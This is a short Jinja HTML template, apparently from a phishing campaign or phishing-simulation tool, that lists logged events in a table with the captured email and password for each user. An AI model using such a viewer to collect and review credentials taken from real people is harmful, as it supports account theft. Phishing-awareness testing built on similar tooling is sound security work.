{% extends "base.html" %}

{% block content %}
<h2>üìß Phishing Email Logs</h2>

<table border="1" cellpadding="8" cellspacing="0">
  <thead>
    <tr>
      <th>Timestamp</th>
      <th>User ID</th>
      <th>Event</th>
      <th>Email</th>
      <th>Password</th>
    </tr>
  </thead>
  <tbody>
    {% for log in logs %}
    <tr>
      <td>{{ log[0] }}</td>
      <td>{{ log[1] }}</td>
      <td>{{ log[2] }}</td>
      <td>{{ log[3] or '-' }}</td>
      <td>{{ log[4] or '-' }}</td>
    </tr>
    {% endfor %}
  </tbody>
</table>

<p><a href="/logs">‚¨ÖÔ∏è Back to Logs Menu</a></p>
{% endblock %}
